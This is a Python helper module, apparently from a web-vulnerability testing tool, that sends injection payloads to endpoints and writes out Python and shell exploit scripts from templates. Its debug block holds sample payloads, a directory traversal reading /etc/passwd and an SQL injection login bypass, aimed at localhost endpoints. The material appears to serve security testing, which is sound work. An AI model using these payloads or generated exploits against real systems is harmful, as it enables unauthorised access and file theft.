"""
Module for shared code that does not fit in anywhere else
"""
from __future__ import print_function

import os
import stat
import datetime
import shutil
import fileinput

import requests

DEBUG = True
# Modify this
# TODO: maybe change this to be a command line argument?
# Note: DON'T end with a TRAILING '/'
TARGET_URL = "http://localhost:8888"
BASE_URL = "http://localhost:8888" if DEBUG else "http://target.com"

TEMPLATE_PLACEHOLDER_GET_REQ_URL = "<REPLACE_WITH_GET_URL>"
TEMPLATE_PLACEHOLDER_POST_REQ_URL = "<REPLACE_WITH_POST_URL>"
TEMPLATE_PLACEHOLDER_POST_REQ_PARAMS = "<REPLACE_WITH_POST_PARAMS>"
TEMPLATE_PLACEHOLDER_POST_REQ_TMP = "<REPLACE_WITH_EXPLOIT_FILENAME>"

def make_request(injection_obj, payload, param_idx=0):
  method, link, params, cookie = injection_obj
  if method == "GET":
    res = requests.get(link, params={params[param_idx]: payload})
  else:
    # TODO: for now, this only POSTs as x-www-form-urlencoded
    # Consider adding more types in the future?
    res = requests.post(link, data={params[param_idx]: payload})
  return res

def make_results_obj(injection_obj, payload):
  # Makes the Python object that will eventually be turned into a JSON object
  # TODO: find out how cookie affects the results JSON
  # TODO: right now, payload is identical for every param
  method, link, params, cookie = injection_obj
  endpoint = link[len(BASE_URL):]
  obj = {
    "endpoint": endpoint,
    "params": { param: payload for param in params },
    "method": method
  }
  return obj

def make_exploit_dir():
  """make a exploit dir to contain all generated exploits
     dirname = exploits_<current time>
  """
  dirname = 'exploits_' + str(datetime.datetime.now())
  os.makedirs(dirname)
  return dirname

def generate_exploits(dirname, vul_dict):
  """generate python exploits and their corresponding .sh files
     Args:
       dirname - dirname of directory to contain the generated files
       vul_dict - the python dict with structure like the json for each vul class
  """
  vul_class = ''.join(vul_dict['class'].split())
  vul_endpt_payload_pairs = vul_dict['results'][BASE_URL]

  for pair_idx in range(len(vul_endpt_payload_pairs)):
   endpoint = vul_endpt_payload_pairs[pair_idx]['endpoint']
   params = vul_endpt_payload_pairs[pair_idx]['params']
   method = vul_endpt_payload_pairs[pair_idx]['method']

   if method == "GET":
     print("GET!")
     exploit_filename = generate_get_exploit_python(dirname, vul_class, pair_idx, endpoint, params)
   else:
     exploit_filename = generate_post_exploit_python(dirname, vul_class, pair_idx, endpoint, params)
     print("POST!")

   generate_exploit_sh(dirname, exploit_filename)

def generate_get_exploit_python(dirname, vul_class, pair_idx, endpoint, params):
  """generate one python exploit for a endpoint and payload pair (GET request version)
  """
  exploit_filename = vul_class + str(pair_idx)
  exploit_filename_with_ext = exploit_filename + '.py'
  exploit_filename_with_dir = dirname + '/' + exploit_filename_with_ext

  # form url for exploit - note shldn't encode the url (use as is)
  exploit_url = BASE_URL + endpoint + '?' + "&".join("%s=%s" % (k,v) for k,v in params.items())

  # copy and replace placeholder in template
  shutil.copy2('exploit_templates/get_req.py', exploit_filename_with_dir)

  file = fileinput.FileInput(exploit_filename_with_dir, inplace=True)
  for line in file:
    print(line.replace(TEMPLATE_PLACEHOLDER_GET_REQ_URL, exploit_url), end='')
  return exploit_filename

def generate_post_exploit_python(dirname, vul_class, pair_idx, endpoint, params):
  """generate one python exploit for a endpoint and payload pair (POST request version)
  """
  exploit_filename = vul_class + str(pair_idx)
  exploit_filename_with_ext = exploit_filename + '.py'
  exploit_filename_with_dir = dirname + '/' + exploit_filename_with_ext

  # form url for exploit - note shldn't encode the url (use as is)
  exploit_url = BASE_URL + endpoint
  exploit_params = str(params)

  # copy and replace placeholder in template
  shutil.copy2('exploit_templates/post_req.py', exploit_filename_with_dir)

  # replace the placeholders - might want to refactor this shit
  file = fileinput.FileInput(exploit_filename_with_dir, inplace=True)
  for line in file:
    if TEMPLATE_PLACEHOLDER_POST_REQ_URL in line:
      print(line.replace(TEMPLATE_PLACEHOLDER_POST_REQ_URL, exploit_url), end='')
    elif TEMPLATE_PLACEHOLDER_POST_REQ_PARAMS in line:
      print(line.replace(TEMPLATE_PLACEHOLDER_POST_REQ_PARAMS, exploit_params), end='')
    elif TEMPLATE_PLACEHOLDER_POST_REQ_TMP in line:
      print(line.replace(TEMPLATE_PLACEHOLDER_POST_REQ_TMP, exploit_filename), end='')
    else:
      print(line, end='')

  return exploit_filename

def generate_exploit_sh(dirname, exploit_filename):
  sh_filename = dirname + '/' + exploit_filename + '.sh'
  with open(sh_filename, 'w+') as sh_file:
    sh_file.write('python {}.py\n'.format(exploit_filename))

  # chmod +x the file
  st = os.stat(sh_filename)
  os.chmod(sh_filename, st.st_mode | stat.S_IEXEC)

# TODO debug: remove after done
if __name__ == '__main__':

  python_dict = {
    "class":"Directory Traversal",
    "results":{
      BASE_URL:[
         {
            "endpoint":"/directorytraversal/directorytraversal.php",
            "params":{
               "ascii":"../../../../../etc/passwd"
            },
            "method":"GET"
          },
         {
            "endpoint":"/another.php",
            "params":{
               "url":"https://another.com",
               "boo":"boo!!"
            },
            "method":"GET"
          },
         {
            "endpoint":"/sqli/sqli.php",
            "params":{
               "username":"' or '1'='1"
            },
            "method":"POST"
          }
      ]
    }
  }
  dirname = make_exploit_dir()
  generate_exploits(dirname, python_dict)
